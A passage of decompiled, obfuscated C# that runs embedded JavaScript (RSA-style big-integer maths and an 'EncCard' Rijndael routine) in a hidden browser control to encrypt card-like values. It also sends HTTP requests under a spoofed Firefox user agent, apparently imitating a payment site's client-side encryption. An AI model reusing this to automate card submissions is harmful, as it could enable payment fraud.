{\r\n    maxDigits = e;\r\n    ZERO_ARRAY = new Array(maxDigits);\r\n    for (var t = 0; t < ZERO_ARRAY.length; t++)\r\n        ZERO_ARRAY[t] = 0;\r\n    bigZero = new BigInt;\r\n    bigOne = new BigInt;\r\n    bigOne.digits[0] = 1\r\n}\r\nfunction BigInt(e) {\r\n    if (typeof e == \"boolean\" && e == true)\r\n        this.digits = null ;\r\n    else\r\n        this.digits = ZERO_ARRAY.slice(0);\r\n    this.isNeg = false\r\n}\r\nfunction biFromDecimal(e) {\r\n    var t = e.charAt(0) == \"-\";\r\n    var n = t ? 1 : 0;\r\n    var r;\r\n    while (n < e.length && e.charAt(n) == \"0\")\r\n        ++n;\r\n    if (n == e.length)\r\n        r = new BigInt;\r\n    else {\r\n        var i = e.length - n;\r\n        var s = i % dpl10;\r\n        if (s == 0)\r\n            s = dpl10;\r\n        r = biFromNumber(Number(e.substr(n, s)));\r\n        n += s;\r\n        while (n < e.length) {\r\n            r = biAdd(biMultiply(r, biFromNumber(1e15)), biFromNumber(Number(e.substr(n, dpl10))));\r\n            n += dpl10\r\n        }\r\n        r.isNeg = t\r\n    }\r\n    return r\r\n}\r\nfunction biCopy(e) {\r\n    var t = new BigInt(true);\r\n    t.digits = e.digits.slice(0);\r\n    t.isNeg = e.isNeg;\r\n    return t\r\n}\r\nfunction biFromNumber(e) {\r\n    var t = new BigInt;\r\n    t.isNeg = e < 0;\r\n    e = Math.abs(e);\r\n    var n = 0;\r\n    while (e > 0) {\r\n        t.digits[n++] = e & maxDigitVal;\r\n        e >>= biRadixBits\r\n    }\r\n    return t\r\n}\r\nfunction reverseStr(e) {\r\n    var t = \"\";\r\n    for (var n = e.length - 1; n > -1; --n)\r\n        t += e.charAt(n);\r\n    return t\r\n}\r\nfunction biToString(e, t) {\r\n    var n = new BigInt;\r\n    n.digits[0] = t;\r\n    var r = biDivideModulo(e, n);\r\n    var i = hexatrigesimalToChar[r[1].digits[0]];\r\n    while (biCompare(r[0], bigZero) == 1) {\r\n        r = biDivideModulo(r[0], n);\r\n        digit = r[1].digits[0];\r\n        i += hexatrigesimalToChar[r[1].digits[0]]\r\n    }\r\n    return (e.isNeg ? \"-\" : \"\") + reverseStr(i)\r\n}\r\nfunction biToDecimal(e) {\r\n    var t = new BigInt;\r\n    t.digits[0] = 10;\r\n    var n = biDivideModulo(e, t);\r\n    var r = String(n[1].digits[0]);\r\n    while (biCompare(n[0], bigZero) == 1) {\r\n        n = biDivideModulo(n[0], t);\r\n        r += String(n[1].digits[0])\r\n    }\r\n    return (e.isNeg ? \"-\" : \"\") + reverseStr(r)\r\n}\r\nfunction digitToHex(e) {\r\n    var t = 15;\r\n    var n = \"\";\r\n    for (i = 0; i < 4; ++i) {\r\n        n += hexToChar[e & t];\r\n        e >>>= 4\r\n    }\r\n    return reverseStr(n)\r\n}\r\nfunction biToHex(e) {\r\n    var t = \"\";\r\n    var n = biHighIndex(e);\r\n    for (var r = biHighIndex(e); r > -1; --r)\r\n        t += digitToHex(e.digits[r]);\r\n    return t\r\n}\r\nfunction charToHex(e) {\r\n    var t = 48;\r\n    var n = t + 9;\r\n    var r = 97;\r\n    var i = r + 25;\r\n    var s = 65;\r\n    var o = 65 + 25;\r\n    var u;\r\n    if (e >= t && e <= n)\r\n        u = e - t;\r\n    else if (e >= s && e <= o)\r\n        u = 10 + e - s;\r\n    else if (e >= r && e <= i)\r\n        u = 10 + e - r;\r\n    else\r\n        u = 0;\r\n    return u\r\n}\r\nfunction hexToDigit(e) {\r\n    var t = 0;\r\n    var n = Math.min(e.length, 4);\r\n    for (var r = 0; r < n; ++r) {\r\n        t <<= 4;\r\n        t |= charToHex(e.charCodeAt(r))\r\n    }\r\n    return t\r\n}\r\nfunction biFromHex(e) {\r\n    var t = new BigInt;\r\n    var n = e.length;\r\n    for (var r = n, i = 0; r > 0; r -= 4,\r\n    ++i)\r\n        t.digits[i] = hexToDigit(e.substr(Math.max(r - 4, 0), Math.min(r, 4)));\r\n    return t\r\n}\r\nfunction biFromString(e, t) {\r\n    var n = e.charAt(0) == \"-\";\r\n    var r = n ? 1 : 0;\r\n    var i = new BigInt;\r\n    var s = new BigInt;\r\n    s.digits[0] = 1;\r\n    for (var o = e.length - 1; o >= r; o--) {\r\n        var u = e.charCodeAt(o);\r\n        var a = charToHex(u);\r\n        var f = biMultiplyDigit(s, a);\r\n        i = biAdd(i, f);\r\n        s = biMultiplyDigit(s, t)\r\n    }\r\n    i.isNeg = n;\r\n    return i\r\n}\r\nfunction biDump(e) {\r\n    return (e.isNeg ? \"-\" : \"\") + e.digits.join(\" \")\r\n}\r\nfunction biAdd(e, t) {\r\n    var n;\r\n    if (e.isNeg != t.isNeg) {\r\n        t.isNeg = !t.isNeg;\r\n        n = biSubtract(e, t);\r\n        t.isNeg = !t.isNeg\r\n    } else {\r\n        n = new BigInt;\r\n        var r = 0;\r\n        var i;\r\n        for (var s = 0; s < e.digits.length; ++s) {\r\n            i = e.digits[s] + t.digits[s] + r;\r\n            n.digits[s] = i & 65535;\r\n            r = Number(i >= biRadix)\r\n        }\r\n        n.isNeg = e.isNeg\r\n    }\r\n    return n\r\n}\r\nfunction biSubtract(e, t) {\r\n    var n;\r\n    if (e.isNeg != t.isNeg) {\r\n        t.isNeg = !t.isNeg;\r\n        n = biAdd(e, t);\r\n        t.isNeg = !t.isNeg\r\n    } else {\r\n        n = new BigInt;\r\n        var r, i;\r\n        i = 0;\r\n        for (var s = 0; s < e.digits.length; ++s) {\r\n            r = e.digits[s] - t.digits[s] + i;\r\n            n.digits[s] = r & 65535;\r\n            if (n.digits[s] < 0)\r\n                n.digits[s] += biRadix;\r\n            i = 0 - Number(r < 0)\r\n        }\r\n        if (i == -1) {\r\n            i = 0;\r\n            for (var s = 0; s < e.digits.length; ++s) {\r\n                r = 0 - n.digits[s] + i;\r\n                n.digits[s] = r & 65535;\r\n                if (n.digits[s] < 0)\r\n                    n.digits[s] += biRadix;\r\n                i = 0 - Number(r < 0)\r\n            }\r\n            n.isNeg = !e.isNeg\r\n        } else\r\n            n.isNeg = e.isNeg\r\n    }\r\n    return n\r\n}\r\nfunction biHighIndex(e) {\r\n    var t = e.digits.length - 1;\r\n    while (t > 0 && e.digits[t] == 0)\r\n        --t;\r\n    return t\r\n}\r\nfunction biNumBits(e) {\r\n    var t = biHighIndex(e);\r\n    var n = e.digits[t];\r\n    var r = (t + 1) * bitsPerDigit;\r\n    var i;\r\n    for (i = r; i > r - bitsPerDigit; --i) {\r\n        if ((n & 32768) != 0)\r\n            break;\r\n        n <<= 1\r\n    }\r\n    return i\r\n}\r\nfunction biMultiply(e, t) {\r\n    var n = new BigInt;\r\n    var r;\r\n    var i = biHighIndex(e);\r\n    var s = biHighIndex(t);\r\n    var o, u, a;\r\n    for (var f = 0; f <= s; ++f) {\r\n        r = 0;\r\n        a = f;\r\n        for (j = 0; j <= i; ++j,\r\n        ++a) {\r\n            u = n.digits[a] + e.digits[j] * t.digits[f] + r;\r\n            n.digits[a] = u & maxDigitVal;\r\n            r = u >>> biRadixBits\r\n        }\r\n        n.digits[f + i + 1] = r\r\n    }\r\n    n.isNeg = e.isNeg != t.isNeg;\r\n    return n\r\n}\r\nfunction biMultiplyDigit(e, t) {\r\n    var n, r, i;\r\n    result = new BigInt;\r\n    n = biHighIndex(e);\r\n    r = 0;\r\n    for (var s = 0; s <= n; ++s) {\r\n        i = result.digits[s] + e.digits[s] * t + r;\r\n        result.digits[s] = i & maxDigitVal;\r\n        r = i >>> biRadixBits\r\n    }\r\n    result.digits[1 + n] = r;\r\n    return result\r\n}\r\nfunction arrayCopy(e, t, n, r, i) {\r\n    var s = Math.min(t + i, e.length);\r\n    for (var o = t, u = r; o < s; ++o,\r\n    ++u)\r\n        n[u] = e[o]\r\n}\r\nfunction biShiftLeft(e, t) {\r\n    var n = Math.floor(t / bitsPerDigit);\r\n    var r = new BigInt;\r\n    arrayCopy(e.digits, 0, r.digits, n, r.digits.length - n);\r\n    var i = t % bitsPerDigit;\r\n    var s = bitsPerDigit - i;\r\n    for (var o = r.digits.length - 1, u = o - 1; o > 0; --o,\r\n    --u)\r\n        r.digits[o] = r.digits[o] << i & maxDigitVal | (r.digits[u] & highBitMasks[i]) >>> s;\r\n    r.digits[0] = r.digits[o] << i & maxDigitVal;\r\n    r.isNeg = e.isNeg;\r\n    return r\r\n}\r\nfunction biShiftRight(e, t) {\r\n    var n = Math.floor(t / bitsPerDigit);\r\n    var r = new BigInt;\r\n    arrayCopy(e.digits, n, r.digits, 0, e.digits.length - n);\r\n    var i = t % bitsPerDigit;\r\n    var s = bitsPerDigit - i;\r\n    for (var o = 0, u = o + 1; o < r.digits.length - 1; ++o,\r\n    ++u)\r\n        r.digits[o] = r.digits[o] >>> i | (r.digits[u] & lowBitMasks[i]) << s;\r\n    r.digits[r.digits.length - 1] >>>= i;\r\n    r.isNeg = e.isNeg;\r\n    return r\r\n}\r\nfunction biMultiplyByRadixPower(e, t) {\r\n    var n = new BigInt;\r\n    arrayCopy(e.digits, 0, n.digits, t, n.digits.length - t);\r\n    return n\r\n}\r\nfunction biDivideByRadixPower(e, t) {\r\n    var n = new BigInt;\r\n    arrayCopy(e.digits, t, n.digits, 0, n.digits.length - t);\r\n    return n\r\n}\r\nfunction biModuloByRadixPower(e, t) {\r\n    var n = new BigInt;\r\n    arrayCopy(e.digits, 0, n.digits, 0, t);\r\n    return n\r\n}\r\nfunction biCompare(e, t) {\r\n    if (e.isNeg != t.isNeg)\r\n        return 1 - 2 * Number(e.isNeg);\r\n    for (var n = e.digits.length - 1; n >= 0; --n)\r\n        if (e.digits[n] != t.digits[n])\r\n            if (e.isNeg)\r\n                return 1 - 2 * Number(e.digits[n] > t.digits[n]);\r\n            else\r\n                return 1 - 2 * Number(e.digits[n] < t.digits[n]);\r\n    return 0\r\n}\r\nfunction biDivideModulo(e, t) {\r\n    var n = biNumBits(e);\r\n    var r = biNumBits(t);\r\n    var i = t.isNeg;\r\n    var s, o;\r\n    if (n < r) {\r\n        if (e.isNeg) {\r\n            s = biCopy(bigOne);\r\n            s.isNeg = !t.isNeg;\r\n            e.isNeg = false;\r\n            t.isNeg = false;\r\n            o = biSubtract(t, e);\r\n            e.isNeg = true;\r\n            t.isNeg = i\r\n        } else {\r\n            s = new BigInt;\r\n            o = biCopy(e)\r\n        }\r\n        return new Array(s,o)\r\n    }\r\n    s = new BigInt;\r\n    o = e;\r\n    var u = Math.ceil(r / bitsPerDigit) - 1;\r\n    var a = 0;\r\n    while (t.digits[u] < biHalfRadix) {\r\n        t = biShiftLeft(t, 1);\r\n        ++a;\r\n        ++r;\r\n        u = Math.ceil(r / bitsPerDigit) - 1\r\n    }\r\n    o = biShiftLeft(o, a);\r\n    n += a;\r\n    var f = Math.ceil(n / bitsPerDigit) - 1;\r\n    var l = biMultiplyByRadixPower(t, f - u);\r\n    while (biCompare(o, l) != -1) {\r\n        ++s.digits[f - u];\r\n        o = biSubtract(o, l)\r\n    }\r\n    for (var c = f; c > u; --c) {\r\n        var h = c >= o.digits.length ? 0 : o.digits[c];\r\n        var p = c - 1 >= o.digits.length ? 0 : o.digits[c - 1];\r\n        var d = c - 2 >= o.digits.length ? 0 : o.digits[c - 2];\r\n        var v = u >= t.digits.length ? 0 : t.digits[u];\r\n        var m = u - 1 >= t.digits.length ? 0 : t.digits[u - 1];\r\n        if (h == v)\r\n            s.digits[c - u - 1] = maxDigitVal;\r\n        else\r\n            s.digits[c - u - 1] = Math.floor((h * biRadix + p) / v);\r\n        var g = s.digits[c - u - 1] * (v * biRadix + m);\r\n        var y = h * biRadixSquared + (p * biRadix + d);\r\n        while (g > y) {\r\n            --s.digits[c - u - 1];\r\n            g = s.digits[c - u - 1] * (v * biRadix | m);\r\n            y = h * biRadix * biRadix + (p * biRadix + d)\r\n        }\r\n        l = biMultiplyByRadixPower(t, c - u - 1);\r\n        o = biSubtract(o, biMultiplyDigit(l, s.digits[c - u - 1]));\r\n        if (o.isNeg) {\r\n            o = biAdd(o, l);\r\n            --s.digits[c - u - 1]\r\n        }\r\n    }\r\n    o = biShiftRight(o, a);\r\n    s.isNeg = e.isNeg != i;\r\n    if (e.isNeg) {\r\n        if (i)\r\n            s = biAdd(s, bigOne);\r\n        else\r\n            s = biSubtract(s, bigOne);\r\n        t = biShiftRight(t, a);\r\n        o = biSubtract(t, o)\r\n    }\r\n    if (o.digits[0] == 0 && biHighIndex(o) == 0)\r\n        o.isNeg = false;\r\n    return new Array(s,o)\r\n}\r\nfunction biDivide(e, t) {\r\n    return biDivideModulo(e, t)[0]\r\n}\r\nfunction biModulo(e, t) {\r\n    return biDivideModulo(e, t)[1]\r\n}\r\nfunction biMultiplyMod(e, t, n) {\r\n    return biModulo(biMultiply(e, t), n)\r\n}\r\nfunction biPow(e, t) {\r\n    var n = bigOne;\r\n    var r = e;\r\n    while (true) {\r\n        if ((t & 1) != 0)\r\n            n = biMultiply(n, r);\r\n        t >>= 1;\r\n        if (t == 0)\r\n            break;\r\n        r = biMultiply(r, r)\r\n    }\r\n    return n\r\n}\r\nfunction biPowMod(e, t, n) {\r\n    var r = bigOne;\r\n    var i = e;\r\n    var s = t;\r\n    while (true) {\r\n        if ((s.digits[0] & 1) != 0)\r\n            r = biMultiplyMod(r, i, n);\r\n        s = biShiftRight(s, 1);\r\n        if (s.digits[0] == 0 && biHighIndex(s) == 0)\r\n            break;\r\n        i = biMultiplyMod(i, i, n)\r\n    }\r\n    return r\r\n}\r\nfunction BarrettMu(e) {\r\n    this.modulus = biCopy(e);\r\n    this.k = biHighIndex(this.modulus) + 1;\r\n    var t = new BigInt;\r\n    t.digits[2 * this.k] = 1;\r\n    this.mu = biDivide(t, this.modulus);\r\n    this.bkplus1 = new BigInt;\r\n    this.bkplus1.digits[this.k + 1] = 1;\r\n    this.modulo = BarrettMu_modulo;\r\n    this.multiplyMod = BarrettMu_multiplyMod;\r\n    this.powMod = BarrettMu_powMod\r\n}\r\nfunction BarrettMu_modulo(e) {\r\n    var t = biDivideByRadixPower(e, this.k - 1);\r\n    var n = biMultiply(t, this.mu);\r\n    var r = biDivideByRadixPower(n, this.k + 1);\r\n    var i = biModuloByRadixPower(e, this.k + 1);\r\n    var s = biMultiply(r, this.modulus);\r\n    var o = biModuloByRadixPower(s, this.k + 1);\r\n    var u = biSubtract(i, o);\r\n    if (u.isNeg)\r\n        u = biAdd(u, this.bkplus1);\r\n    var a = biCompare(u, this.modulus) >= 0;\r\n    while (a) {\r\n        u = biSubtract(u, this.modulus);\r\n        a = biCompare(u, this.modulus) >= 0\r\n    }\r\n    return u\r\n}\r\nfunction BarrettMu_multiplyMod(e, t) {\r\n    var n = biMultiply(e, t);\r\n    return this.modulo(n)\r\n}\r\nfunction BarrettMu_powMod(e, t) {\r\n    var n = new BigInt;\r\n    n.digits[0] = 1;\r\n    while (true) {\r\n        if ((t.digits[0] & 1) != 0)\r\n            n = this.multiplyMod(n, e);\r\n        t = biShiftRight(t, 1);\r\n        if (t.digits[0] == 0 && biHighIndex(t) == 0)\r\n            break;\r\n        e = this.multiplyMod(e, e)\r\n    }\r\n    return n\r\n}\r\nvar biRadixBase = 2;\r\nvar biRadixBits = 16;\r\nvar bitsPerDigit = biRadixBits;\r\nvar biRadix = 1 << 16;\r\nvar biHalfRadix = biRadix >>> 1;\r\nvar biRadixSquared = biRadix * biRadix;\r\nvar maxDigitVal = biRadix - 1;\r\nvar maxInteger = 9999999999999998;\r\nvar maxDigits;\r\nvar ZERO_ARRAY;\r\nvar bigZero, bigOne;\r\nvar dpl10 = 15;\r\nvar highBitMasks = new Array(0,32768,49152,57344,61440,63488,64512,65024,65280,65408,65472,65504,65520,65528,65532,65534,65535);\r\nvar hexatrigesimalToChar = new Array(\"0\",\"1\",\"2\",\"3\",\"4\",\"5\",\"6\",\"7\",\"8\",\"9\",\"a\",\"b\",\"c\",\"d\",\"e\",\"f\",\"g\",\"h\",\"i\",\"j\",\"k\",\"l\",\"m\",\"n\",\"o\",\"p\",\"q\",\"r\",\"s\",\"t\",\"u\",\"v\",\"w\",\"x\",\"y\",\"z\");\r\nvar hexToChar = new Array(\"0\",\"1\",\"2\",\"3\",\"4\",\"5\",\"6\",\"7\",\"8\",\"9\",\"a\",\"b\",\"c\",\"d\",\"e\",\"f\");\r\nvar lowBitMasks = new Array(0,1,3,7,15,31,63,127,255,511,1023,2047,4095,8191,16383,32767,65535);\r\n</script>";
		string text2 = "<html>\n<head>\n\n" + text + "\n\n\n\n</head>\n\n<body>\n\n\n\n</body>\n\n</html> \n\n";
		WebBrowser webBrowser = new WebBrowser();
		webBrowser.Navigate("about:blank");
		webBrowser.Document.Write(text2);
		return webBrowser.Document.InvokeScript("encryptUsingJS", new object[2] { null, false }).ToString();
	}

	internal static string smethod_13(string string_8)
	{
		string[] array = string_8.Split(new string[1] { "||" }, StringSplitOptions.None);
		string string_9 = array[0];
		string string_10 = array[1];
		string text = "";
		if (array.Length >= 3)
		{
			for (int i = 2; i < array.Length; i++)
			{
				text = text + smethod_14(array[i], string_9, string_10) + "||";
			}
			text = text.Substring(0, text.Length - 2);
		}
		return text;
	}

	public static string smethod_14(string string_8, string string_9, string string_10)
	{
		string text = "<html><script>var BS=128;var BB=128;var RA=[,,,,[,,,,10,,12,,14],,[,,,,12,,12,,14],,[,,,,14,,14,,14]];var SO=[,,,,[,1,2,3],,[,1,2,3],,[,1,3,4]];var RC=[0x01,0x02,0x04, 0x08,0x10,0x20,0x40,0x80,0x1b,0x36,0x6c,0xd8,0xab,0x4d,0x9a,0x2f,0x5e,0xbc,0x63,0xc6,0x97,0x35,0x6a,0xd4,0xb3,0x7d,0xfa,0xef,0xc5,0x91];var SB=[99,124,119,123,242,107,111,197,48,1,103,43,254,215,171,118,202,130,201,125,250,89,71,240,173,212,162,175,156,164,114,192,183,253,147,38,54,63,247,204,52,165,229,241,113,216,49,21,4,199,35,195,24,150,5,154,7,18,128,226,235,39,178,117,9,131,44,26,27,110,90,160,82,59,214,179,41,227,47,132,83,209,0,237,32,252,177,91,106,203,190,57,74,76,88,207,208,239,170,251,67,77,51,133,69,249,2,127,80,60,159,168,81,163,64,143,146,157,56,245,188,182,218,33,16,255,243,210,205,12,19,236,95,151,68,23,196,167,126,61,100,93,25,115,96,129,79,220,34,42,144,136,70,238,184,20,222,94,11,219,224,50,58,10,73,6,36,92,194,211,172,98,145,149,228,121,231,200,55,109,141,213,78,169,108,86,244,234,101,122,174,8,186,120,37,46,28,166,180,198,232,221,116,31,75,189,139,138,112,62,181,102,72,3,246,14,97,53,87,185,134,193,29,158,225,248,152,17,105,217,142,148,155,30,135,233,206,85,40,223,140,161,137,13,191,230,66,104,65,153,45,15,176,84,187,22];var SBI=[82,9,106,213,48,54,165,56,191,64,163,158,129,243,215,251,124,227,57,130,155,47,255,135,52,142,67,68,196,222,233,203,84,123,148,50,166,194,35,61,238,76,149,11,66,250,195,78,8,46,161,102,40,217,36,178,118,91,162,73,109,139,209,37,114,248,246,100,134,104,152,22,212,164,92,204,93,101,182,146,108,112,72,80,253,237,185,218,94,21,70,87,167,141,157,132,144,216,171,0,140,188,211,10,247,228,88,5,184,179,69,6,208,44,30,143,202,63,15,2,193,175,189,3,1,19,138,107,58,145,17,65,79,103,220,234,151,242,207,206,240,180,230,115,150,172,116,34,231,173,53,133,226,249,55,232,28,117,223,110,71,241,26,113,29,41,197,137,111,183,98,14,170,24,190,27,252,86,62,75,198,210,121,32,154,219,192,254,120,205,90,244,31,221,168,51,136,7,199,49,177,18,16,89,39,128,236,95,96,81,127,169,25,181,74,13,45,229,122,159,147,201,156,239,160,224,59,77,174,42,245,176,200,235,187,60,131,83,153,97,23,43,4,126,186,119,214,38,225,105,20,99,85,33,12,125];function cSL(TA,PO){var T=TA.slice(0,PO);TA=TA.slice(PO).concat(T);return TA;}var Nk=BS/32;var Nb=BB/32;var Nr=RA[Nk][Nb];function XT(P){P<<=1;return((P&0x100)?(P^0x11B):(P));}function GF(x,y){var B,R=0;for(B=1;B<256;B*=2,y=XT(y)){if(x&B)R^=y;}return R;}function bS(SE,DR){var S;if(DR==\"e\")\tS=SB;else \tS=SBI;for(var i=0;i<4;i++)\tfor(var j=0;j<Nb;j++)\t\tSE[i][j]=S[SE[i][j]];}function sR(SE,DR){for(var i=1;i<4;i++)if(DR==\"e\")\tSE[i]=cSL(SE[i],SO[Nb][i]);else \tSE[i]=cSL(SE[i],Nb-SO[Nb][i]);}function mC(SE,DR){\tvar b=[];\tfor(var j=0;j<Nb;j++)\t\t{\t\tfor(var i=0;i<4;i++)\t\t{\t\t\tif(DR==\"e\")\t\t\t\tb[i]=GF(SE[i][j],2)^GF(SE[(i+1)%4][j],3)^SE[(i+2)%4][j]^SE[(i+3)%4][j];\t\t\telse\t\t\t\tb[i]=GF(SE[i][j],0xE)^GF(SE[(i+1)%4][j],0xB)^GF(SE[(i+2)%4][j],0xD)^GF(SE[(i+3)%4][j],9);\t\t}\t\tfor(var i=0;i<4;i++)\t\t\tSE[i][j]=b[i];\t\t}}function aRK(SE,RK){\tfor(var j=0;j<Nb;j++)\t{\t\tSE[0][j]^=(RK[j]&0xFF);\t\tSE[1][j]^=((RK[j]>>8)&0xFF);\t\tSE[2][j]^=((RK[j]>>16)&0xFF);\t\tSE[3][j]^=((RK[j]>>24) & 0xFF);\t}}function YE(Y){var EY=[];var T;Nk=BS/32;Nb=BB/32;Nr=RA[Nk][Nb];for(var j=0;j<Nk;j++)\tEY[j]=(Y[4*j])|(Y[4*j+1]<<8)|(Y[4*j+2]<<16)|(Y[4*j+3]<<24);for(j=Nk;j<Nb*(Nr+1);j++){T=EY[j-1];if(j%Nk==0)\tT=((SB[(T>>8)&0xFF])|(SB[(T>>16)&0xFF]<<8)|(SB[(T>>24)&0xFF]<<16)|(SB[T&0xFF]<<24))^RC[Math.floor(j/Nk)-1];else if(Nk>6&&j%Nk==4)\tT=(SB[(T>>24)&0xFF]<<24)|(SB[(T>>16)&0xFF]<<16)|(SB[(T>>8)&0xFF]<<8)|(SB[T&0xFF]);EY[j]=EY[j-Nk]^T;}return EY;}function Rd(SE,RK){bS(SE,\"e\");sR(SE,\"e\");mC(SE,\"e\");aRK(SE,RK);}function iRd(SE,RK){aRK(SE,RK);mC(SE,\"d\");sR(SE,\"d\");bS(SE, \"d\");}function FRd(SE,RK){bS(SE,\"e\");sR(SE,\"e\");aRK(SE,RK);}function iFRd(SE,RK){aRK(SE,RK);sR(SE,\"d\");bS(SE,\"d\");}function encrypt(bk,EY){\tvar i;\tif(!bk||bk.length*8!=BB)\t\treturn;\tif(!EY)\t\treturn;bk=pB(bk);\taRK(bk,EY);\tfor(i=1;i<Nr;i++)\t\tRd(bk,EY.slice(Nb*i,Nb*(i+1)));\tFRd(bk,EY.slice(Nb*Nr));return uPB(bk);}function decrypt(bk,EY){var i;\tif(!bk||bk.length*8!=BB)\t\treturn;\tif(!EY)\t\treturn;bk=pB(bk);iFRd(bk,EY.slice(Nb*Nr));\t\tfor(i=Nr-1;i>0;i--)\t\t\tiRd(bk,EY.slice(Nb*i,Nb*(i+1)));aRK(bk,EY);\t\t\treturn uPB(bk);}function byteArrayToString(bA){\tvar R=\"\";\tfor(var i=0;i<bA.length; i++)\tif(bA[i]!=0)R+=String.fromCharCode(bA[i]);\treturn R;}function byteArrayToHex(bA){var R=\"\";if(!bA)\treturn;for(var i=0;i<bA.length;i++)\tR+=((bA[i]<16)?\"0\":\"\")+bA[i].toString(16);return R;}function hexToByteArray(hS){var bA=[];if(hS.length%2)return;if(hS.indexOf(\"0x\")==0||hS.indexOf(\"0X\")==0)hS = hS.substring(2);\tfor (var i=0;i<hS.length;i+=2)bA[Math.floor(i/2)]=parseInt(hS.slice(i,i+2),16);return bA;}function pB(OT){var SE = [];if(!OT||OT.length%4)return;SE[0]=[];SE[1]=[];SE[2]=[];SE[3]=[];for(var j=0;j<OT.length;j+=4){SE[0][j/4]=OT[j];SE[1][j/4]=OT[j+1];SE[2][j/4]=OT[j+2];SE[3][j/4]=OT[j+3];}return SE;}function uPB(PK){var R=[];for(var j=0;j<PK[0].length;j++){R[R.length]=PK[0][j];R[R.length]=PK[1][j];R[R.length]=PK[2][j];R[R.length]=PK[3][j];}return R;}function fPT(PT){var bpb=BB/8;var i;if(typeof PT==\"string\"||PT.indexOf){PT=PT.split(\"\");for(i=0;i<PT.length;i++)PT[i]=PT[i].charCodeAt(0)&0xFF;}for(i=bpb-(PT.length%bpb);i>0&&i<bpb;i--) PT[PT.length]=0;return PT;}function gRB(hM){var i;var bt=[];for(i=0;i<hM;i++)bt[i]=Math.round(Math.random()*255);return bt;}function rijndaelEncrypt(PT,Y,M){var EY,i,abk;var bpb=BB/8;var ct;if(!PT||!Y)return;if(Y.length*8!=BS)return;if(M==\"CBC\")ct=gRB(bpb);else {M=\"ECB\";ct=[];}PT=fPT(PT);EY=YE(Y);for (var bk=0; bk<PT.length/bpb;bk++){abk=PT.slice(bk*bpb,(bk+1)*bpb);if(M==\"CBC\")for (var i=0;i<bpb; i++)abk[i] ^= ct[bk*bpb+i];ct=ct.concat(encrypt(abk,EY));}return ct;}function rijndaelDecrypt(CT,Y,M){var EY;var bpb=BB/8;var pt=[];var abk;var bk;if(!CT||!Y||typeof CT==\"string\")return;if(Y.length*8!=BS)return;if(!M)M=\"ECB\";EY=YE(Y);for(bk=(CT.length/bpb)-1;bk>0;bk--){abk=decrypt(CT.slice(bk*bpb,(bk+1)*bpb),EY);if(M==\"CBC\")for(var i=0;i<bpb;i++)pt[(bk-1)*bpb+i]=abk[i]^CT[(bk-1)*bpb+i];else pt=abk.concat(pt);}if(M==\"ECB\") pt=decrypt(CT.slice(0,bpb),EY).concat(pt);return pt;}function stringToByteArray(st){var bA=[];for(var i=0;i<st.length; i++)bA[i]=st.charCodeAt(i);return bA;}function genkey(){\tvar j=\"\";\twhile(1)\t{\t\tvar i=Math.random().toString();\t\tj+=i.substring(i.lastIndexOf(\".\")+1);\t\tif(j.length>31)\t\t\treturn j.substring(0, 32);\t}}function EncCard(fValue, payId, mode){return byteArrayToHex(rijndaelEncrypt(fValue,hexToByteArray(payId), mode))}</script><body></body></html>";
		WebBrowser webBrowser = new WebBrowser();
		webBrowser.Navigate("about:blank");
		webBrowser.Document.Write(text);
		return webBrowser.Document.InvokeScript("EncCard", new object[3] { string_8, string_9, string_10 }).ToString();
	}

	internal static string smethod_15(string string_8, string string_9, string string_10, string string_11, string string_12, string string_13)
	{
		return smethod_6("5#" + HttpUtility.UrlEncode(string_8) + "|$|" + string_9 + "|$|" + string_10 + "|$|" + string_11 + "|$|" + string_12);
	}

	internal static string smethod_16(string string_8, string string_9, ref string string_10)
	{
		string empty = string.Empty;
		string_10 = "";
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_8);
			httpWebRequest.ProtocolVersion = HttpVersion.Version11;
			httpWebRequest.ReadWriteTimeout = 50000;
			httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
			httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0";
			httpWebRequest.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
			httpWebRequest.ContentType = "application/json";
			httpWebRequest.KeepAlive = true;
			httpWebRequest.Timeout = 50000;
			if (!(string_9 != ""))
			{
				httpWebRequest.Method = "GET";
				httpWebRequest.ContentLength = 0L;
			}
			else
			{
				httpWebRequest.Method = "POST";
				byte[] bytes = Encoding.UTF8.GetBytes(string_9);
				httpWebRequest.ContentLength = bytes.Length;
				Stream requestStream = httpWebRequest.GetRequestStream();
				requestStream.Write(bytes, 0, bytes.Length);
				requestStream.Close();
			}
			try
			{
				HttpWebResponse httpWebResponse = httpWebRequest.GetResponse() as HttpWebResponse;
				Stream responseStream = httpWebResponse.GetResponseStream();
				empty = new StreamReader(responseStream, Encoding.Default).ReadToEnd();
				responseStream.Close();
				httpWebResponse.Close();
				if (empty.IndexOf("Serialization/\">") > 0)
				{
					empty = empty.Substring(empty.IndexOf("Serialization/\">") + 16);
					empty = empty.Substring(0, empty.IndexOf("<"));
					empty = empty.Replace(" ", "").Trim();
				}
				if (empty.Contains("Exception"))
				{
					empty = "";
				}
				return empty;
			}
			catch (Exception)
			{
			}
		}
		catch (Exception)
		{
		}
		return "";
	}
}
